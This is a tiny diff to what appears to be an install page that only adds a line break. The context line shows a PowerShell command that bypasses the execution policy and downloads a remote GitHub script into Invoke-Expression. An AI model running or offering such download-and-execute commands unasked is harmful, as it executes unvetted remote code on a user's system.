@@ -52,7 +52,7 @@ powershell -NoProfile -Command "try { [Net.ServicePointManager]::SecurityProtoco
 <br/>
 <br/>
 Try This:
-<br/>
+<br/><br/>
 powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $dest='%CD%'; iwr 'https://raw.githubusercontent.com/FunPhantasie/Loki/main/install.ps1' -UseBasicParsing -Headers @{ 'User-Agent'='WindowsPowerShell/5.1' } | iex"
 <br/>
 <br/>
